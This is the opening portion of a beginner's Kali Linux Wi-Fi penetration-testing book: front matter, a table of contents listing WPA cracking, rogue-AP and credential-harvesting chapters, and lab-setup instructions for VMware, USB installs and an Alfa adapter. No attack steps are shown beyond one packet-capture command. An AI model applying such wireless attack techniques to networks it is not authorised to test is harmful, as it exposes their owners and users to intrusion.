@@ -1,0 +1,3345 @@
+ 
+ii Kali Linux Wireless  Pent esting and 
+Security for Beginners  
+ 
+Copyright © 201 7 rootsh3ll.com  
+All rights reserved. No part of this book may be reproduced, stored in a retrieval system, or 
+transmitted in any form or by  any means, without the prior written permission of the 
+publisher, except in the case of brief quotations embedded in critical articles or reviews.  
+Every effort has been made in the preparation of this book to ensure the accuracy of the 
+information presen ted. However, the information contained in this book is sold without 
+warranty, either express or implied. Neither the authors, nor rootsh3ll , and its dealers and 
+distributors will be held liable for any damages caused or alleged to be caused directly or 
+indirectly by this book.  
+rootsh3ll  Publishing has endeavoured to provide trademark information about all of the 
+companies and products mentioned in this book by the appropriate use of capitals. 
+However, rootsh3ll  Publishing cannot guarantee the accuracy of this information.  
+Published:  July 2017  
+Published by  rootsh3ll.com  
+  
+
+ 
+iii Credits  
+ 
+ 
+ 
+Author  
+Hardeep Singh  
+ 
+Key Contributors  
+Pomwtin  
+Pink Panther  
+ Proof -reader   
+Nishant Mishra  
+ 
+Cover Work  
+Hardeep Singh  
+ 
+Financial Support  
+Varun Bhatia  
+ 
+  
+
+ 
+iv About the Author   
+Hardeep Singh  is a name among millions who hack , failed and kept practicing with no 
+motive to earn, but to learn . Just like any other noob , he too started the BlackH at way .  
+Sooner he realised that the  humans race is already eating the planet up, fighting each other, 
+more than any other species and at least he should use his skills for the better. All he had 
+was an undying learning attitude to hold on to  and a love of  teaching . 
+ 
+And once discovered, he consistently kept resigning from his comfort zone and to share all 
+his learnings and small researches with the  community . It is this very urge of helping people 
+and doing something good for the society that inspired him to start rootsh3ll.com . 
+ 
+It is his diligent focus, the great support of his family and the faith of his friends  that keeps 
+him going.  
+ 
+He is the founder of rootsh3ll.com and shares his work and in -depth Penetration Testing 
+articles on his blog apparently,  a C|EH (Certified Ethical hacker) from EC -Council  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+
+ 
+v About the Reviewer  
+Nishant Mishra  is an experienced trainer with a demonstrated history of working in the 
+computer and network security industry. Skilled in Ethical hacking/P entesting, Linux 
+system/server admin , Python, Perl and Holding C|EH , C|HFI , E|CSA , CCNA . Engineering with 
+a Bachelor of Technology (B -Tech) focused in Computer Science from lovely professional 
+university.  
+ 
+He spends most of his time giving seminars on eth ical hacking and teaching students in 
+schools and colleges and loves doing it  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+  
+
+
+ 
+vi rootsh3ll. com  
+Support files, eBooks, videos , webinars , research 
+materials  and more  
+For support files and downloads related to your book, please visit github.com/iamrootsh3ll  
+At rootsh3ll .com , you can also read a collection of free technical articles, sign up for a range of free 
+newsletters , and receive exclusive in-depth security and pentesting articles and eBooks.  
+ 
+Members area  
+members.rootsh3ll.com  is exclusively setup for all the queries related to this book and for the further 
+possibilities that we cannot perform in the book itself. Members get free access to all the eBooks 
+published, exclusive video content and the webinars hosted on various topics.  
+Confirm your purchase on purchase@rootsh3ll.com  to get 3 months free VIP  access to the member’s 
+area  
+ 
+
+ 
+vii Special Thanks  
+ 
+ 
+I am immensely thankful to a few people who have been a very crucial part of my life also 
+who supported and pushed me for pursuing my dream. People because of whom this book 
+has become a (virtual) reality.  
+ 
+Thanks to my mom and dad  for letting me do whatever I wanted to do, even in the hard 
+times with nothing to ask for. I couldn’t be more grateful to you.   
+ 
+Varun Bhatia , my brother, for keeping his (financial) arm behind me. Without him, rootsh3ll 
+would have been dead and buried in the darkness of this magnanimous ocean called the 
+Internet. He is my go -to person whenever anyone says “ A friend in need is a friend indeed ”. 
+He never asked anything in return, other than my success, I am extremely lucky to have him  
+as a friend, a brother, not to mention an investor who invests in my goodwill and success 
+without any ROI.  He is a real gem!  
+ 
+Prienka Bakshi , one of the few closest people whom I admire from heart always. Heartily 
+thanks to her for being on my side, for p ushing me every time I went low and stopping me  
+from wasting time , helping me to write this book even when she lives far away she made it 
+sure to make a mark on me and to help me make a mark (small one).  
+ 
+This book is also dedicated to everybody in the wo rld aspiring to learn the core technology, 
+how to break and secure them.  
+ 
+Thanks to everyone!   
+
+ 
+viii  
+Disclaimer   
+The content within this book is for educational purposes only. It is designed to help users  
+learn about Wi -Fi network vulnerabilities to  test their  own system against information 
+security threats and protect their IT infrastructure from similar attacks. rootsh3ll.com and 
+the author of this book take no responsibility for actions resulting from the inappropriate 
+usage of learning material contained wi thin this book.  
+ 
+ 
+
+ 
+ii Table of Contents  
+0  
+SETTING UP THE LAB  1 
+HARDWARE REQUIREMENTS  1 
+SOFTWARE REQUIREMENTS  2 
+KALI LINUX INSTALLATION : 3 
+INSTALL KALI LINUX UNDER VMW ARE 3 
+INSTALLING KALI LINUX ON PC 11 
+Kali Linux on USB: Advantages  11 
+HD Install Kali Linux: Prerequisites  11 
+Stop wasting Time  12 
+Create Kali Linux  Bootable USB  13 
+REMOVE KALI LINUX HD INSTALL  16 
+SETTING UP WIRELESS ADAPTER  18 
+CONFIGURING ALFA CARD  20 
+SUMMARY  25 
+1  
+UNDERSTANDING BASICS  OF WI -FI NETWORKS  26 
+WIRELESS NETWORKS (WI-FI) AND ITS NEED  26 
+WHAT IS WI-FI? 27 
+WHAT IS THE NEED FOR WI-FI? 27 
+TYPES OF ENCRYPTION A ND THEIR NEED  27 
+WHAT ARE THE TYPES OF  ENCRYPTION ? 27 
+WHAT IS THE NEED ? 28 
+HOW WPA2  IS DIFFERENT FROM WPA?  28 
+UNDERSTANDING PUBLIC AND PRIVATE  IP 29 
+PUBLIC IP 29 
+PRIVATE IP 29 
+Classes, Subnet and Pool Size  29 
+HOW TO CHECK PUBLIC IP? 30 
+USES OF PUBLIC IP 30 
+POSSIBLE ATTA CKS ON A WI-FI ACCESS POINT (AP) 30 
+FUTURE OF WI-FI 31 
+
+ 
+iii 2  
+CRACKING THE WIRELES S NETWORK SECURI TY 32 
+INTRODUCTION TO AIRCRACK -NG SUITE OF TOOLS  32 
+WHAT IS AIRCRACK -NG? 32 
+DOWNLOAD AIRCRACK -NG 33 
+INSTALL AIRCRACK -NG 33 
+AIRMON -NG 34 
+AIRODUMP -NG 35 
+CONCLUSION  36 
+ 
+INTRODUCTION TO WIRESHARK  37 
+HISTORY  38 
+Why Ethereal was renamed?  38 
+INSTALLATION AND SETUP  39 
+Monitor mode  40 
+Select Sniffing Interface  41 
+Stop sniffing  42 
+FILTERS AND PACKET ANALYSIS  42 
+Display filters  42 
+Capture Filters  43 
+Capture filter is not a display filter  43 
+SAVE PACKETS  45 
+COLOUR CODING  45 
+CONCLUSION  45 
+ 
+WEP  CRACKING USING AIRCRACK -NG 46 
+OVERVIEW  46 
+ANOTHER WAY TO FIX TH E “MONITOR MODE ” ERROR IN KALI LINUX 50 
+ 
+WPA2 -PERSONAL CRACKING [AIRCRACK -NG] 51 
+WHAT IS WPA2-PSK?  51 
+4-WAY HANDSHAKE  51 
+WHAT IS A DICTIONARY ATTACK ? 53 
+COUNTERMEASURES  57 
+CONCLUSION  58 
+ 
+WPS  CRACKING  59 
+WHAT IS WPS?  59 
+WHAT IS REAVER ? 59 
+AN UGLY TRUTH ABOUT WPS  [FOR PENTESTERS ] 62 
+SUPPORTED WIRELESS DRIVERS  62 
+COUNTERMEASURES  63 
+
+ 
+iv 3  
+AUTOMATED WI -FI CRACKING  64 
+WIFITE: AUTOMATED WIRELESS HACKING /AUDITING TOOL 64 
+DOWNLOAD WIFITE 65 
+INSTALLI NG A TOOL (WIFITE) AS A COMMAND IN LINUX 65 
+CRACKING WEP  USING WIFITE 66 
+Things to note  67 
+CRACKING WPA/2  USING WIFITE 69 
+HOW TO FIX WPA/2  HANDSHAKE CAPTURE E RROR IN WIFITE? 70 
+Using airodump -ng to fix Wifite Handshake issue  71 
+Use latest version of Wifite to fix Handshake capture issue  71 
+LASER FOCUSED WIFITE 72 
+4  
+SPEEDING UP WPA/2 CR ACKING  74 
+INTRODUCTION  74 
+WHAT IS PMK?  75 
+WHAT IS COWPA TTY? 76 
+WHAT IS PYRIT? 76 
+What is space -time -trade -off? 76 
+INSTALLATION AND CONF IGURATION  77 
+INSTALLING COWPA TTY FROM SOURCE CODE  77 
+INSTALLING PYRIT FROM SOURCE CODE  77 
+GENERATE PMK S USING GENPMK  78 
+GENERATE PMK S USING PYRIT 79 
+ 
+CRACK WPA2 -PSK  [ COWPA TTY VS . AIRCRACK -NG] 80 
+CRACKING WPA2 -PSK  WITH AIRCRACK -NG 80 
+[ EXTRA!]  PYRIT + COWPA TTY STDIN 81 
+ 
+USING GPU  BASED TOOLS  84 
+USING GPU  FOR CRACKING WPA/2  PASSWORDS  85 
+WHAT IS HASHCAT ? 85 
+WHY USE HASHCAT AT FIRST PLAC E? 85 
+Supported Attack types  87 
+SETTING UP THE LAB 87 
+Installing Graphics driver  87 
+Download Hashcat  87 
+
+ 
+v Pcap file compatibility with Hashcat  87 
+Convert .cap file to <.hccap> file  88 
+CRACKING WPA/2  PASSWORDS USING HASHCAT  88 
+WPA/2 Mask attack using Hashcat  89 
+Hybrid attack.  91 
+WPA/2 Cracking Pause/resume in Hashcat (One of the best features)  92 
+How to restore?  93 
+ 
+AIRCRACK BOOST SCRIPT  94 
+FEATURES  94 
+DEPENDENCIES  94 
+MAKE THE SHELL SCRIPT EXECUTABLE  94 
+EXECUTE  95 
+Execute via Command line arguments  95 
+Execute via Standard Input  95 
+5  
+POST -EXPLOITING THE NETWORK  98 
+INTRODUCTION  98 
+WHAT IS A SUBNET? 99 
+TOOLS USED  100 
+INSTALLATION AND CONFIGURATION  100 
+SCANNING THE SUBNET  101 
+SCAN THE SUBNET USING NMAP  101 
+HOW DOES ARP  POISONING WORK? 104 
+PREVENT SNIFFING ATTACKS  107 
+JAMMING THE WI-FI NETWORK  108 
+DISSECTING A WIRELESS  CLIENT  109 
+6  
+ROGUE ACCESS POINT: INTRODUCTION  110 
+OVERVIEW  110 
+ATTACK SUMMARY  111 
+TOOLS USED  111 
+ATTACK PREPARATION  111 
+ROGUE ACCESS POINT : SETUP  112 
+INSTALLATION  112 
+Install isc -dhcp -server  112 
+
+ 
+vi CONFIGURE APACHE MYSQL  AND DHCP  SERVER  113 
+Configure isc -dhcp -server 114 
+(OPTIONAL ) AIRMON -NG, NETWORK -MANAGER CONFLICT  114 
+INFORMATION GATHERING  115 
+Enable monitor mode  115 
+Information Gathering with airodump -ng 115 
+(OPTIONAL ) BRING THE TX-POWER TO MAX : 1000MW 115 
+Why we need to change region to operate our card at 1000mW?  116 
+CONFIGURE NETWORKING  116 
+Fire up the Fake Access Point  116 
+Allocate IP and Subnet Mask  116 
+Set Firewall rules in Iptable s 117 
+Enable IP forwarding  117 
+Start the Services  118 
+ATTACK ! 118 
+ 
+ROGUE AP SETUP : AN EASIER WAY 121 
+UNDERSTANDING THE BASIC ATTACK SCENARIO  121 
+CONFIGURATION SETUP  122 
+Installation:  123 
+Configure hostapd  123 
+Configure dnsmasq  123 
+OPTIONAL CONFIGURATIO NS 125 
+7  
+ROGUE AP:  A DEEPER DIVE  127 
+HACKING WPA2  ENTERPRISE  127 
+INTRODUCTION  128 
+Difference betw een WPA2 - Personal and Enterprise?  128 
+INSTALLATION  128 
+CRACK THE HASH 130 
+INTERFACE VIRTUALISATION : SINGLE  CARD FAKE AP 132 
+INTRODUCTION  132 
+WHAT IS A VIRTUAL INTERFACE (VIF)? 132 
+HARDWARE USED  134 
+SOFTWARE USED  134 
+SETUP SINGLE CARD ROGUE ACCESS POINT + HOTSPOT  135 
+CONNECT TO A WI-FI HOTSPOT  136 
+POWER UP THE ROGUE AP 137 
+(Optional) Enable Internet access for victim  137 
+Enable iptables forwarding  137 
+Spoof incoming HTTP traffic  137 
+ 
+
+ 
+vii "NO INTERNET ACCESS " WARNING FIX 138 
+EXAMPLES OF "NO INTERNET ACCESS " ERROR ON WIN 7/10  139 
+What exactly is causing "No internet access" error?  139 
+8  
+CAPTIVE PORTALS  144 
+IN THEORY  144 
+INTRODUCTION  145 
+BASIC STRATEGY BEHIND  CAPTIVE PORTAL DETECTION  145 
+DIFFERENCES BETWEEN C LIENT DEVICES  146 
+Captive Portal Detection method by various Operating Systems  146 
+Apple's secret "wispr" request  147 
+ 
+IN REAL WORLD  149 
+WHAT IS MOD _REWRITE ? 149 
+Advantages of mod_rewrite  149 
+mod_rewrite Basics  149 
+Defining Rules  150 
+Server Variables  150 
+Rule Syntax  150 
+USER AGENT  BASED REDIRECTION  151 
+CONFIGURE APACHE FOR MOD _REWRITE  152 
+Captive Portal configuration for Apple Devices  152 
+Captive Porta l configuration for Android Devices  152 
+Captive Portal configuration for Windows  153 
+Set up iptables for redirection  154 
+Enable modules  154 
+PROTECTION AGAINST THIS ATTACK  154 
+9  
+ULTIMATE FAKE AP  155 
+OVERVIEW  155 
+SETUP ACCESS POINT  156 
+STEP 1: KILL TROUBLESOME PR OCESSES  156 
+STEP 2: START DHCP SERVER  156 
+STEP 3: CONFIGURE APACHE 2 WEBSERVER  156 
+Enable mod_rewrite module  157 
+STEP 4: SPOOF DNS  157 
+
+ 
+viii STEP 5: HARVEST TH E KEYS 157 
+Command break down:  158 
+STEP 6: WRAPPING UP 158 
+STEP 7: THE SECRET SAUCE  158 
+STEP 8: MAKE IT STEALTHIER (OPTIONAL ) 159 
+10   
+WI-FI HACKING [APPEN DIX]  165 
+WAR DRIVING : INTRODUCTION  165 
+CALCULATING ACCESS POINT LOCATION  166 
+ 
+FIND LOST/STOLEN DEVICES  167 
+LOCATE WI-FI DEVICE WITH PROBEMON  167 
+Installation  167 
+What is IEEE OUI List  168 
+ 
+HANDSHAKE VALIDATION  170 
+REQUIREMENTS : 170 
+MANUALLY : USING WIRESHARK PACKET ANALYSER  170 
+Command Breakdown:  170 
+USING TOOLS LIKE : AIRCR ACK-NG, PYRIT 172 
+Conclusion:  174 
+ 
+  
+
+ 
+ix Preface  
+Wireless Networks have become ubiquitous in today's world. Millions of people use it 
+worldwide every day at their homes, offices and public hotspots to logon to the Internet and 
+do both personal and professional work. Even though wireless makes life incredibly easy 
+and gives us such great mobility, it comes with risks. In recent times, insecure wireless 
+networks have been used to break into companies, banks and government organizations. 
+The frequency of these attacks is only intensified, as network administrators are still clueless 
+when it comes to securing wireless networks in a robust and fool proof way.  
+Kali Linux Wireless Pen -testing and Security for Beginners  is aimed at helping the reader 
+understand the depth of insecurities associated with wireless networks, and how to conduct 
+penetration tests to find and plug them  and further secure/patch them . This is an esse ntial 
+read for those who would like to conduct security audits on wireless networks and always 
+wanted a step -by-step practical. As every wireless attack explained in this book is 
+immediately followed by a practical demo, the learning is very complete.  
+We have chosen Kali Linux as the platform to test all the wireless at tacks in this book. Kali 
+Linux, as  most of you may already be aware, is the world's most popular penetration testing 
+distribution. It contains hundreds of security and hacking tools, some of  which we will use in 
+this course of this book.  
+ 
+Who this book is for  
+Though this book is a Beginner's series, it is meant for all levels of users, from amateurs right 
+through to wireless security experts. There is something for everyone. The book starts  with 
+simple attacks but then moves on to explain the more complicated ones, and finally 
+discusses bleeding edge attacks and research. As all attacks are explained using practical 
+demonstrations, it is very easy for readers at all levels to quickly try the  attack out by 
+themselves. Please note that even though the book highlights the different attacks, which 
+can be launched against a wireless network, the real purpose is to educate the user to 
+become a wireless penetration tester. An adept penetration teste r would understand all the 
+attacks out there and would be able to demonstrate them with ease, if requested by his 
+client.  
+ 
+Piracy  
+Piracy of copyright material on the Internet is an ongoing problem across all media. At 
+rootsh3ll , we take the protection of  our copyright and licenses very seriously. If you come 
+across any illegal copies of our works, in any form, on the Internet, please provide us with 
+the location address or website name immediately so that we can pursue a remedy.  
+Please contact us at copyright@rootsh3ll .com with a link to the suspected pirated 
+material.  
+
+ 
+x We appreciate your help in protecting our authors, and our ability to bring you valuable 
+content.  
+Conventions  
+In this book, you will find a number of styles of text that distinguish betw een different kinds of 
+information. Here are some examples of these styles, and an explanation of their meaning.  
+Code words in text, database table names, folder names, filenames, file extensions, pathnames, dummy 
+URLs, user input, and Twitter handles are  shown as follows: "Ope n Terminal and type iwconfig ."  
+Any command -line input or output is written as follows:  
+airodump -ng --bssid 00:c0:ca:3b:34:b6  --channel 6  --write wlan0mon  
+ 
+grey box with black outline displays previous command output  
+and/or content s of a file  
+ 
+Important notes will be shown in yellow boxes  
+ 
+Breakdown of the command will be explained in blue side -blocks like this  
+ 
+Questions  
+You can contact us at query@rootsh3ll .com if you are having a problem with any aspect of 
+the book,  post your que ry directly on the support forum members.rootsh3ll.com  or mail the 
+author on harry@rootsh3ll.com  and we will do our best to address it.  
+  
+
+ 
+1 0 
+Setting up the Lab  
+ 
+ 
+ 
+ 
+ 
+ 
+Hardware requirements  
+• A Laptop  with Working Network Interface  Card (NIC)  
+• I will use a laptop to install and run Kali Linux in VMWare as attacker’s machine and 
+host  (Windows) as the victim’s machine. Kali Linux should have at least 1 GB RAM of 
+allotted RAM . This is because we will be running a  
+• lot of memory -intensive software throughout the series.  
+• 1 Alfa wireless adapter:  For best result,  we need a USB Wi -Fi card which supports 
+Packet injection and Packet sniffing. We will use  Alfa AWUS036NH 2000mW  in this 
+series. Which you can purchase on eBay/Amazon  which is retailing un der $30 at the 
+time of writing.  
+• 1 TP-LINK WN -722N  v1 (not version 2) USB Adapter  [Optional ] 
+• Weaker signal reception, Lower transmission(TX) power, Cheaper and one of the 
+best suited budget Wi -Fi cards for Kali Linux. U sed for a very specific task which 
+cannot be accomplished using Alfa AWUS036NH card. See Chapter 7 part 2  
+• 1 Access Point : An access point that  supports WEP, WPA/WPA2 and WPS encryption 
+standards. A TP-Link MR3420 3G wireless -N router  is used for illustration  in this 
+book . 
+• A stable, fast Internet connection for optimal downloading of software and other 
+experiments.  
+
+ 
+2 Software requirements  
+ 
+• Kali Linux – The Ultimate Pentesting O.S.  
+• Kali Linux 2017.1 ISO can be downloaded from the official website’s download page 
+located at https://www.kali.org/downloads/ . It is an Open source OS which comes 
+with a variety of pre -installed  tools for penetration testing.  
+ 
+• Virtual Machine / Hard Drive(HD) Install  
+• A hard Drive installation may be carri ed out in case You want to run Kali Linux on full 
+resources. If you are on a GPT Parti tion, installing a Virtual Machine shall be an 
+appropriate choice for you . 
+• VMWare Workstation is used for running Kali Linux and connecting wireless devices. 
+So that it w on’t be any different from a Kali Linux installed on PC with an Alfa card 
+connected. You can download the latest version of VMWare from its  official website . 
+ 
+• Windows 7/8/10  as Host machine (s): We will  use Windows as the victim which will 
+connect to the original Access Point in the series. The host machine’s network card 
+will be dedicated to host (Windows ) only and Alfa card will be dedicated to Kali Linux 
+(in VMWare) for the Attack purpose only.  
+ 
+Note : Even though we are using windows machine to connect to AP, we can do this to any 
+electronic device capable of performing wireless (Wi -Fi related) tasks such as Mobile, Tablet, 
+Wireless printer etc.  
+  
+
+ 
+3 Kali Linux Installation:  
+ 
+Install Kali Linux Under VMWare  
+ 
+As a beginner, it is safe to install Kali Linux under a virtual environment. It gives you freedom 
+to experiment, explore the OS without having to lose the data in any case.  
+A virtual machine,  or VM, is an application that runs under Windows that creates an 
+environment that simulates a completely separate computer . 
+ 
+Everything that happens in the VM stays within the VM. It behaves exactly as if it were a 
+completely separate physical machine.  
+That implies that any downloads, changes, updates, installations ... anything ... that is created 
+or saved within the virtual machine is only accessible through the VM in some way.  
+And if you delete the VM, it's like getting rid of a PC. Everything on  the vi rtual hard disk is 
+erased.  
+Assuming that you’ve downloaded appropriate version of Kali (32/64 bit), let’s begin the 
+installation  
+ 
+
+
+ 
+4 Step 1:  
+Start VMWare Workstation, go to file menu and click on “New Virtual Machine  “ 
+ 
+Step 2:  
+Click  next . with selected opt ion “ Typical(recommended ) “ 
+ 
+
+
+ 
+5  
+Step 3:  
+Set VM name and Browse the Kali Linux ISO file.  
+Step 4: 
+Allocate disk size to Kali and click  Next  
+
+
+ 
+6 20 GB will be optimal for virtual machine as we will be using mostly pre -installed tools 
+during this series.  
+Step 5: 
+Click  Finish  and then  Power on this virtual machine . 
+ 
+Step 6: 
+Now the virtual machine will boot. Select /Highlight the option  Install  and press [ ENTER ] 
+ 
+ 
+
+
+ 
+7 Step 7: 
+Enter you Hostname ( rs in this case)  
+ 
+Step 8: 
+Enter desired password ( pass  in this case)  
+ 
+Step 9: 
+Select disk press [ ENTER ] then select  All files in one partition  and press [ ENTER ]. 
+
+
+ 
+8 Step 10: 
+Select  Finish partitioning and write changes to disk.  
+ 
+Step 11: 
+Select  Yes to confirm Write changes to disks and press [ ENTER ]. 
+ 
+Step 12 : 
+Wait for setup to Install the System  
+ 
+Step 1 3: 
+Setup will ask you for selecting a network mirror  to download latest packages. Select  No and 
+then click  cancel.   
+
+
+ 
+9 Updating manually from desktop will save us time.  
+ 
+Step 14 : 
+Install  GRUB ( GRand Unified Bootloader)  to the Master Boot Record. To choose from the 
+options to boot Kali Linux within VMWare after installation.  
+Step 1 5: 
+Setup is now complete. Select  Continue  and hit [ ENTER ]. 
+ 
+ 
+Step 1 6: 
+Now start the Virtual machi ne “Kali Linux”, and press [ ENTER ] to continue boot.  
+ 
+
+
+ 
+10  
+Step 1 7: 
+Press  [ENTER ] on other and enter the credentials  
+Username:  root  
+Password:  pass  (Entered previously  on Step 8), and click on login  
+ 
+Now, we have successfully installed Kali Linux in VMWare Wo rkstation and logged in to the 
+Desktop.  
+Let’s see how to install Kali on HD or Dual Boot  
+
+
+ 
+11 Installing Kali Linux on PC  
+For a beginner, it is highly non -recommended to  dual boot  Kali Linux  on your main machine. 
+As it can lead to potential data loss, accidenta lly. 
+Kali can be run either in live mode, i.e. directly from USB without any installation, or install it 
+completely on your Hard Drive.  
+ 
+Kali Linux on USB: Advantages  
+ 
+The best way to run or install Kali Linux is to run it from a USB. This method has sever al 
+advantages:  
+• Ultra -portable  – USB always has  been known for its portability. Installing Kali on a 
+USB makes it ultra -portable and allows us to run it anywhere we go. just need to 
+Plug -n-play the USB stick and we are up with our Kali.  
+• Faster installation  –  Older versions of USB (2.0) supports reading speed of a max. of 
+7-10 MBPS and recent USB 3.0 are even faster than that. Which makes installing Kali 
+Linux at blazing fast speed.  
+• Customizable  – Linux is always open source and so Kali. You can customize an d build 
+Kali Linux  and install your own version on the USB stick . 
+• Persistent  – Booting into Li ve disc from USB clears all the activity or tasks performed 
+after system is restarted. Live Kali installed on USB can be made persistent with a 
+little effort.  
+ 
+As we will make many changes to the system along the road, it is ideal to have a full -fledged 
+install available.  
+Though, for a beginner I recommend to perform all the tests under a VM.  
+ 
+HD Install Kali Linux : Prerequisites  
+ 
+• USB stick (>4 GB)  - We ca n boot Live system or install  through USB. 4+ gigs of 
+storage would be enough.  
+• Kali Linux ISO  - ISO fil e contains the OS and necessary boot information, which will 
+be written to the USB stick  allow us to access GRUB.   
+• Laptop/Desktop (~4 GB RAM)  - We will be performing extensive -memory tasks. so, a 
+minimum requirement is a system with 4 GB of RAM and dual co re processor. To 
+ensure that Kali Linux perform well throughout the series.  
+• A Windows installation - We will nee d Windows to partition the disk  for Kali Linux. It 
+will be easy and safe for the beginners.  
+• Rufus Bootable USB Creator - Self-explanatory. Downl oad from https://rufus.akeo.ie/  
+ 
+ 
+
+ 
+12 GPT. Check. Stop wasting Time  
+Master boot record  (MBR ) disks use the standard(legacy) BIOS partition table. GUID 
+partition table  (GPT) disks use unified extensible firmware interface (UEFI ). One advantage 
+of GPT disks is that you can have more than four primary partitions  on each disk.  
+Every other laptop now comes with UEFI mode, unlike older machines that runs on legacy 
+BIOS. With GPT partition table comes UEFI and with msdos/ Master Boot Record (MBR)  
+partition table  comes BIOS . Both target Hard Drive and installation media (USB) should  have 
+same partition table . Either GPT -GPT or MBR -MBR, it is an incompatibility otherwise.  
+It is simple to check whether you have a GPT type disk or msd os. 
+ 
+1. Press Win + r in your Windows  
+2. Type diskpart . Press [ENTER]  
+3. Enter  list disk  
+4. Check for asterisk under last column i.e. GPT  
+ 
+DISKPART> list disk  
+ 
+  Disk ###  Status  Size   Free  Dyn Gpt 
+  --------  -------------   -------  -------   ---   --- 
+  Disk 0     Online  447 GB   1024 KB 
+  Disk 1     No Media  0 B       0 B 
+  Disk 2     Online  14 GB     0 B  
+ 
+If a disk is GPT, it will have an asterisk ( * ) under the “GPT” column. If it’s an MBR disk, it will 
+be blank under the GPT column.  
+Mine is an MBR Style parti tion table, so GPT column is blank. Otherwise it would look like 
+this:  
+DISKPART> list disk  
+ 
+  Disk ### Status  Size   Free  Dyn Gpt 
+  --------  -------------   -------  ------- ---   --- 
+  Disk 0     Online  447 GB   1024 KB  * 
+  Disk 1     No Media  0 B       0 B 
+  Disk 2     Online  14 GB     0 B  
+ 
+Disk 0 is my 500 GB SSD Drive, and  
+Disk 2  is my 16 gigs USB drive. 14.8 GB total usable.  
+  
+
+ 
+13 Create Kali Linux Bootable USB  
+Now that you know what partition type your machine has , next step is to  create a bootable 
+USB with  Rufus.   
+ 
+ 
+1. Download and open 
+Rufus  
+ 
+2. Select appropriate 
+partition scheme.  
+ 
+ 
+ 
+ 
+ 
+ 
+3. Select USB Drive  
+ 
+4. Quick Format the drive  
+ 
+5. Browse for Kali Linux 
+ISO file  
+ 
+6. Burn!  
+ 
+ 
+ 
+ 
+ 
+ 
+Linux systems uses a dedicated space , Swap  space/partition , as a memory management 
+method.  It is simply the pagefile.sys for Linux systems.  
+Swap  space in Linux is used when the amount of physical memory (RAM) is full. If the 
+system needs more memory resources and the RAM is full, inactive pages in memory are 
+moved to the swap  space. Swap space can be a dedicated swap partition  (recommended), a 
+swap  file, or a combination of swap partitions  and swap  files.  
+ 
+Rule of thumb : Swap  file/partition size  = Physical memory . 
+  
+
+
+ 
+14 Before you begin installation, create a partition which will automatical ly split into . 
+1. Installation and 
+2. Swap partition  
+ 
+ 
+ 
+Step 1 : 
+Right click on  Computer . 
+Click Manage . 
+ 
+ 
+ 
+Step 2 : 
+Select  Storage > Disk management  in left 
+panel   
+1. Right Click  on a drive with > 40 GB free space.  
+2. Shrink  (C: in this case) to cut some space from selected drive.  
+Selected partition should be primary. Primary type partition is needed to boot Kali. We will 
+write Kali’s  boot loader(GRUB)  to Master boot record during installation. So, make sure 
+partiti on you select is Primary.  
+ 
+ 
+Wait for the scan to Finish.  
+Enter the size in MB ( 40 GB x 1024  = 40960  MB). C lick on  Shrink.  
+ 
+
+
+ 
+15  
+I had only 20484 MB shrink -able space. But it is recommended for you to use at least 30 GB  
+to prevent low disk space issues .  
+ 
+An Unallocated Black coloured partition  is created  
+ 
+Bootable USB. Check!  
+ 
+Partition. Check!  
+ 
+Shutdown and boot with USB.  
+ 
+Booting from USB/DVD media varies between vendors. Try pressing < ESC>, <F8>, <F10>, <F12> or Delete  key 
+to boot from your USB. Else give first boot device priority  to USB in BIOS  
+ 
+ 
+ 
+
+
+ 
+16 Remove Kali Linux  HD Install  
+ 
+After Removing Kali Linux, you won’t be able to boot into Windows or any OS installed after 
+you restart. So, make sure you have already created bootable USB of Kali Linux for the 
+Installation or Rescue ! 
+ 
+Q. Why  remove Kali Linux? It is the Best Penetration testing distribution out there.  
+ 
+Well, as Kali Linux is an Open Source Distro and comes with absolutely NO WARRANTY, and 
+also, we will be using root account very frequently, so th ere are chances that one might 
+corrupt the boot loader while playing around with Kali and cause problem booting  into the 
+OS. 
+ 
+A previously installed unusable Kali Linux on your PC exists and you decide to remove it and 
+install another Pentesting Distro( any). Utilising the space while preventing MBR, we will 
+learn the process to remove Kali Linux neatly.  
+ 
+Q. Why it won’t be able to boot?  
+ 
+Kali Linux installs its boot informa tion to Master boot record while replacing  any previous 
+OS’s (generally Windows) boot info . it is then added to  option menu  at start up to choose 
+from which OS to boot.  
+So, a corrupted GRUB loader means, an unusable list of OSes . 
+ 
+Q. What you need to do?  
+Delete the main and swap partition.  
+ 
+Follow step -by-step, or you might end up deleting your sensitive data:  
+ 
+1. Right click on  Computer  > Manage . 
+2. Storage >  Disk management  on the left panel.  
+ 
+
+ 
+17 You should see something like this:  
+Partition size may vary.  
+Right  click on  Main partition  then click on  Delete volume.  
+A Window will appear. click on  delete . This will delete both Main and associated S wap 
+partition.  
+ 
+It will create an unallocated partition (~46 GB in this case).  
+Restart your system.  
+Boot  from Kali Linux  USB.  
+Run Live or install . 
+Voila!  
+You are done with your Kali Linux installation.  
+ 
+  
+
+
+ 
+18 Setting up Wireless Adapter  
+Setting an Alfa card in Kali Linux is pretty easy as all the required drivers  comes pre -installed  
+to enable packet injection and packet sniffin g.  
+Being a purpose specific card, Alfa card does not need any configuration in Kali Linux. It  is a 
+Plug -and-play device. However,  if you try to use Alfa card in windows  <10 you’ll have to 
+install drivers from the CD (In the Box).  
+For Driver compatibility issues: Go  here 
+ 
+Follow the step -by-step instructions to set up your card:  
+ 
+Step 1:  
+Plug in your Alfa card into the laptop . 
+VMWare  > VM > Removable Devices > Wi-Fi Card  > Conn ect ( Disconnect from host)  
+ 
+ 
+Here , Windows is the host machine for any VMWare OS . To connect and access Alfa card 
+inside of Virtual Machine we have to disconnect it from the host system(Windows).  
+ 
+Step  2:  
+Log into Kali Desktop.  
+Right click  > “Open Termin al” and type  iwconfig . 
+ 
+You will see something like this:  
+ 
+eth0      no wireless extensions.  
+lo        no wireless extensions.  
+wlan0     IEEE 802.11bgn   ESSID:off/any    
+          Mode:Managed   Access Point: Not -Associated    Tx-Power=27 dBm     
+          Retry short limit:7    RTS thr:off    Fragment thr:off  
+          Encryption key:off  
+          Power Management:off  
+ 
+ 
+ 
+
+
+ 
+19 wlan0  is the wireless interface created for the Alfa card.  
+To check the current state of interface , run ifconfig  
+ 
+eth0      Link encap:Ethernet   HWaddr 18:03:73:9b:fe:0f    
+          UP BROADCAST MULTICAST   MTU:1500   Metric:1  
